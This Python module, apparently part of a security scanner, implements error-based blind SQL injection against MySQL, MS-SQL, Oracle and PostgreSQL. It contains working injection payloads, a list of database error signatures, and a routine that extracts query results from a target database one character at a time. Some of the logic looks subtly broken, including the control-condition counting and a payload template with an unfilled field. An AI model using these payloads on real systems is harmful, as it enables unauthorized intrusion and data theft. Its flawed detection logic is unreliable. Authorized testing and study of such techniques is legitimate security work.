"""
Error-Based/Conditional Error Blind SQL Injection Detector

Implements conditional error inference techniques for blind SQL injection
where errors are triggered conditionally based on tested conditions.
This allows data extraction when no out-of-band channels are available.
"""

import logging
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import statistics

logger = logging.getLogger(__name__)


@dataclass
class ErrorPattern:
    """Error pattern for analysis"""
    has_error: bool
    status_code: int
    error_indicators: List[str]
    content_length: int
    response_time: float


class ErrorBasedBlindDetector:
    """
    Detector for error-based blind SQL injection using conditional error triggering.
    
    When a condition is true, a deliberate error (divide-by-zero, type conversion, etc.)
    is triggered. The application responds differently (HTTP 500, error message, etc),
    allowing inference of true/false conditions.
    """
    
    # Conditional error payloads for different databases
    CONDITIONAL_ERROR_PAYLOADS = {
        'mysql': [
            # Divide by zero when condition is true
            {
                'payload_template': "' AND IF(({condition}), (SELECT 1/0), 1)--",
                'description': 'MySQL divide-by-zero on true condition',
                'error_expected': 'true'
            },
            {
                'payload_template': "' AND IF(({condition}), (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT {data}), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y), 1)--",
                'description': 'MySQL double value error on true condition',
                'error_expected': 'true'
            },
            # No error when condition is false
            {
                'payload_template': "' AND IF(NOT({condition}), (SELECT 1/0), 1)--",
                'description': 'MySQL divide-by-zero on false condition (control)',
                'error_expected': 'false'
            },
        ],
        'mssql': [
            # Divide by zero using CASE
            {
                'payload_template': "' AND 1=CASE WHEN ({condition}) THEN 1/0 ELSE 1 END--",
                'description': 'MS-SQL divide-by-zero on true condition',
                'error_expected': 'true'
            },
            {
                'payload_template': "' AND 1=CASE WHEN ({condition}) THEN CAST('a' AS INT) ELSE 1 END--",
                'description': 'MS-SQL type conversion error on true condition',
                'error_expected': 'true'
            },
            # Control - no error
            {
                'payload_template': "' AND 1=CASE WHEN NOT({condition}) THEN 1/0 ELSE 1 END--",
                'description': 'MS-SQL divide-by-zero on false condition (control)',
                'error_expected': 'false'
            },
        ],
        'oracle': [
            # Divide by zero in subquery
            {
                'payload_template': "' AND (SELECT CASE WHEN ({condition}) THEN 1/0 ELSE 1 END FROM dual)=1--",
                'description': 'Oracle divide-by-zero on true condition',
                'error_expected': 'true'
            },
            {
                'payload_template': "' AND (SELECT 1/0 FROM dual WHERE ({condition}))=1--",
                'description': 'Oracle divide-by-zero in WHERE clause',
                'error_expected': 'true'
            },
            {
                'payload_template': "' AND (CASE WHEN ({condition}) THEN TO_NUMBER('a') ELSE 1 END)=1--",
                'description': 'Oracle type conversion error on true condition',
                'error_expected': 'true'
            },
            # Control - no error
            {
                'payload_template': "' AND (SELECT CASE WHEN NOT({condition}) THEN 1/0 ELSE 1 END FROM dual)=1--",
                'description': 'Oracle divide-by-zero on false condition (control)',
                'error_expected': 'false'
            },
        ],
        'postgresql': [
            # Type conversion errors
            {
                'payload_template': "' AND (SELECT CASE WHEN ({condition}) THEN CAST('a' AS INTEGER) ELSE 1 END)=1--",
                'description': 'PostgreSQL type conversion error on true condition',
                'error_expected': 'true'
            },
            {
                'payload_template': "' AND (SELECT CASE WHEN ({condition}) THEN 1/0 ELSE 1 END)=1--",
                'description': 'PostgreSQL divide-by-zero on true condition',
                'error_expected': 'true'
            },
            # Control
            {
                'payload_template': "' AND (SELECT CASE WHEN NOT({condition}) THEN 1/0 ELSE 1 END)=1--",
                'description': 'PostgreSQL divide-by-zero on false condition (control)',
                'error_expected': 'false'
            },
        ],
    }
    
    # Error indicators in HTTP responses
    ERROR_INDICATORS = [
        # MySQL errors
        'mysql_query', 'mysql_fetch', 'mysql_num_rows', 'mysql_error', 
        'You have an error in your SQL syntax',
        'Warning: mysql_', 'MySQLSyntaxErrorException',
        'Division by zero', 'Illegal mix of collations',
        
        # MS-SQL errors
        'Microsoft SQL', 'ODBC SQL Server', 'SQLServer JDBC Driver',
        'Unclosed quotation mark', 'Incorrect syntax near',
        'Divide by zero error', 'Conversion failed',
        'CAST', 'convert', 'varchar',
        
        # Oracle errors
        'ORA-', 'Oracle error', 'Oracle.DataAccess',
        'java.sql.SQLException: ORA-', 'oracle.jdbc',
        'ORA-01476', 'divisor is equal to zero',
        'ORA-01722', 'invalid number',
        
        # PostgreSQL errors
        'PostgreSQL query failed', 'pg_query', 'pg_exec',
        'ERROR: division by zero',
        'invalid input syntax', 'unterminated quoted string',
        'psycopg2.errors',
        
        # Generic SQL errors
        'SQL syntax', 'SQL error', 'database error',
        'syntax error', 'unexpected end of SQL command',
        'DbException', 'SQLException',
        'Warning: Division by zero',
        'Fatal error',
    ]
    
    # Character extraction templates with conditional errors
    EXTRACTION_TEMPLATES = {
        'mysql': {
            'char_at_position': "SUBSTRING(({data}), {position}, 1)='{char}'",
            'ascii_at_position': "ASCII(SUBSTRING(({data}), {position}, 1))={ascii_code}",
            'length_check': "LENGTH(({data}))={length}",
        },
        'mssql': {
            'char_at_position': "SUBSTRING(({data}), {position}, 1)='{char}'",
            'ascii_at_position': "ASCII(SUBSTRING(({data}), {position}, 1))={ascii_code}",
            'length_check': "LEN(({data}))={length}",
        },
        'oracle': {
            'char_at_position': "SUBSTR(({data}), {position}, 1)='{char}'",
            'ascii_at_position': "ASCII(SUBSTR(({data}), {position}, 1))={ascii_code}",
            'length_check': "LENGTH(({data}))={length}",
        },
        'postgresql': {
            'char_at_position': "SUBSTRING(({data}), {position}, 1)='{char}'",
            'ascii_at_position': "ASCII(SUBSTRING(({data}), {position}, 1))={ascii_code}",
            'length_check': "LENGTH(({data}))={length}",
        },
    }
    
    def __init__(self, confidence_threshold: float = 0.8):
        """
        Initialize error-based blind detector.
        
        Args:
            confidence_threshold: Minimum confidence for positive detection
        """
        self.confidence_threshold = confidence_threshold
        self.baseline_pattern = None
        self.true_error_patterns = []
        self.false_no_error_patterns = []
        
    def analyze_response(self, response, response_time: float = 0.0) -> ErrorPattern:
        """
        Analyze response for error indicators.
        
        Args:
            response: HTTP response object
            response_time: Response time in seconds
        
        Returns:
            ErrorPattern object
        """
        content = response.text if hasattr(response, 'text') else str(response)
        status_code = response.status_code if hasattr(response, 'status_code') else 200
        
        # Check for error indicators
        found_indicators = []
        has_error = False
        
        # HTTP status code indicates error
        if status_code >= 500:
            has_error = True
            found_indicators.append(f'HTTP {status_code}')
        
        # Check content for error messages
        content_lower = content.lower()
        for indicator in self.ERROR_INDICATORS:
            if indicator.lower() in content_lower:
                has_error = True
                found_indicators.append(indicator)
        
        return ErrorPattern(
            has_error=has_error,
            status_code=status_code,
            error_indicators=found_indicators,
            content_length=len(content),
            response_time=response_time
        )
    
    def establish_baseline(self, base_response, base_response_time: float = 0.0) -> ErrorPattern:
        """
        Establish baseline response pattern.
        
        Args:
            base_response: Normal response without injection
            base_response_time: Response time
        
        Returns:
            Baseline error pattern
        """
        baseline = self.analyze_response(base_response, base_response_time)
        self.baseline_pattern = baseline
        logger.info(f"Baseline established: status={baseline.status_code}, has_error={baseline.has_error}")
        return baseline
    
    def test_conditional_error_injection(self, test_function, url: str, param: str,
                                        param_type: str, db_type: str = 'mysql',
                                        **kwargs) -> Dict[str, Any]:
        """
        Test for error-based blind SQL injection using conditional errors.
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Parameter to test
            param_type: Parameter type (GET/POST)
            db_type: Database type (mysql, mssql, oracle, postgresql)
            **kwargs: Additional request parameters
        
        Returns:
            Detection results dictionary
        """
        results = {
            'vulnerable': False,
            'confidence': 0.0,
            'method': 'error_based_blind',
            'db_type': db_type,
            'evidence': [],
            'error_on_true': 0,
            'no_error_on_false': 0,
            'differentiation_score': 0.0,
        }
        
        logger.info(f"Testing error-based blind injection on parameter: {param} (DB: {db_type})")
        
        if 'normal' not in str(self.baseline_pattern) and not self.baseline_pattern:
            logger.warning("No baseline established")
            return results
        
        # Get payloads for database type
        payloads = self.CONDITIONAL_ERROR_PAYLOADS.get(db_type, [])
        if not payloads:
            logger.warning(f"No payloads for database type: {db_type}")
            return results
        
        true_error_count = 0
        false_no_error_count = 0
        
        # Test with simple true/false conditions
        test_conditions = [
            ("1=1", True),  # Always true
            ("1=2", False), # Always false
            ("2=2", True),  # Always true
            ("1=0", False), # Always false
        ]
        
        for condition, is_true in test_conditions:
            for payload_info in payloads:
                # Only test payloads that match the condition
                if (is_true and payload_info['error_expected'] == 'true') or \
                   (not is_true and payload_info['error_expected'] == 'false'):
                    
                    payload = payload_info['payload_template'].format(condition=condition)
                    
                    try:
                        response = test_function(payload, param, param_type, **kwargs)
                        if not response:
                            continue
                        
                        pattern = self.analyze_response(response)
                        
                        # For true conditions with error-expected payloads, we should see errors
                        if is_true and payload_info['error_expected'] == 'true':
                            if pattern.has_error:
                                true_error_count += 1
                                self.true_error_patterns.append(pattern)
                                logger.debug(f"✓ Error triggered on TRUE condition: {pattern.error_indicators}")
                        
                        # For false conditions with error-expected payloads, we should NOT see errors
                        elif not is_true and payload_info['error_expected'] == 'false':
                            if not pattern.has_error:
                                false_no_error_count += 1
                                self.false_no_error_patterns.append(pattern)
                                logger.debug(f"✓ No error on FALSE condition (expected)")
                    
                    except Exception as e:
                        logger.debug(f"Payload test failed: {e}")
                        continue
        
        # Calculate confidence
        total_true_tests = len(test_conditions) * len([p for p in payloads if p['error_expected'] == 'true'])
        total_false_tests = len(test_conditions) * len([p for p in payloads if p['error_expected'] == 'false'])
        
        true_rate = true_error_count / total_true_tests if total_true_tests > 0 else 0
        false_rate = false_no_error_count / total_false_tests if total_false_tests > 0 else 0
        
        differentiation = (true_rate + false_rate) / 2.0
        
        results['error_on_true'] = true_error_count
        results['no_error_on_false'] = false_no_error_count
        results['differentiation_score'] = differentiation
        
        logger.info(f"Error on TRUE: {true_error_count}/{total_true_tests}")
        logger.info(f"No error on FALSE: {false_no_error_count}/{total_false_tests}")
        logger.info(f"Differentiation score: {differentiation:.2f}")
        
        # Detection logic: Need good differentiation
        if differentiation >= self.confidence_threshold:
            results['vulnerable'] = True
            results['confidence'] = differentiation
            
            results['evidence'].append({
                'description': 'Conditional error differentiation detected',
                'error_on_true': true_error_count,
                'no_error_on_false': false_no_error_count,
                'differentiation': differentiation,
            })
            
            logger.info(f"✓ Error-based blind SQLi detected! Confidence: {results['confidence']:.2f}")
        else:
            logger.info("No clear conditional error differentiation detected")
        
        return results
    
    def extract_data_via_conditional_errors(self, test_function, url: str, param: str,
                                           param_type: str, query: str, 
                                           db_type: str = 'mysql',
                                           max_length: int = 100, 
                                           use_ascii: bool = True,
                                           **kwargs) -> Optional[str]:
        """
        Extract data using conditional error technique.
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Vulnerable parameter
            param_type: Parameter type
            query: SQL query to extract (e.g., 'database()', '@@version', 'SELECT user FROM dual')
            db_type: Database type
            max_length: Maximum length to extract
            use_ascii: Use ASCII code comparison (faster) vs character comparison
            **kwargs: Additional parameters
        
        Returns:
            Extracted data or None
        """
        if not self.true_error_patterns or not self.false_no_error_patterns:
            logger.warning("No error patterns established, run test_conditional_error_injection first")
            return None
        
        logger.info(f"Starting conditional error extraction for: {query}")
        
        # Get templates for database
        templates = self.EXTRACTION_TEMPLATES.get(db_type, self.EXTRACTION_TEMPLATES['mysql'])
        
        # Get payloads for this database
        db_payloads = self.CONDITIONAL_ERROR_PAYLOADS.get(db_type, [])
        # Use first error-expected payload
        error_payload = next((p for p in db_payloads if p['error_expected'] == 'true'), None)
        if not error_payload:
            logger.error(f"No suitable error payload for {db_type}")
            return None
        
        extracted = ""
        
        # Character set to test
        if use_ascii:
            # Test ASCII codes 32-126 (printable characters)
            test_values = list(range(32, 127))
        else:
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@:/() '
            test_values = list(charset)
        
        for position in range(1, max_length + 1):
            found_char = None
            
            for test_value in test_values:
                # Build condition for character at position
                if use_ascii:
                    condition = templates['ascii_at_position'].format(
                        data=query,
                        position=position,
                        ascii_code=test_value
                    )
                    char = chr(test_value)
                else:
                    condition = templates['char_at_position'].format(
                        data=query,
                        position=position,
                        char=test_value
                    )
                    char = test_value
                
                # Build payload with condition
                payload = error_payload['payload_template'].format(
                    condition=condition,
                    data=query
                )
                
                try:
                    response = test_function(payload, param, param_type, **kwargs)
                    if not response:
                        continue
                    
                    pattern = self.analyze_response(response)
                    
                    # If error is triggered, the condition was TRUE
                    if pattern.has_error:
                        found_char = char
                        logger.debug(f"Position {position}: found '{char}' (ASCII {ord(char) if len(char) == 1 else '?'})")
                        break
                
                except Exception as e:
                    logger.debug(f"Extraction failed for position {position}, value {test_value}: {e}")
                    continue
            
            if found_char:
                extracted += found_char
                logger.info(f"Extracted so far: '{extracted}'")
            else:
                # No character found, end of string
                logger.info("No more characters found")
                break
        
        logger.info(f"✓ Extraction complete: '{extracted}'")
        return extracted if extracted else None
    
    def generate_report(self) -> str:
        """Generate report for error-based blind detection."""
        report = []
        report.append("=" * 60)
        report.append("ERROR-BASED BLIND SQL INJECTION REPORT")
        report.append("=" * 60)
        
        if self.true_error_patterns and self.false_no_error_patterns:
            report.append("\n[✓] Conditional Error Differentiation Detected")
            report.append(f"Patterns with errors (true conditions): {len(self.true_error_patterns)}")
            report.append(f"Patterns without errors (false conditions): {len(self.false_no_error_patterns)}")
            
            # Show error indicators found
            all_indicators = set()
            for pattern in self.true_error_patterns:
                all_indicators.update(pattern.error_indicators)
            
            if all_indicators:
                report.append(f"\nError Indicators Found:")
                for indicator in sorted(all_indicators):
                    report.append(f"  - {indicator}")
            
            # Show status codes
            true_status_codes = [p.status_code for p in self.true_error_patterns]
            false_status_codes = [p.status_code for p in self.false_no_error_patterns]
            
            report.append(f"\nStatus Codes:")
            report.append(f"  True conditions: {set(true_status_codes)}")
            report.append(f"  False conditions: {set(false_status_codes)}")
        else:
            report.append("\n[✗] No Conditional Error Differentiation Detected")
        
        report.append("=" * 60)
        return "\n".join(report)
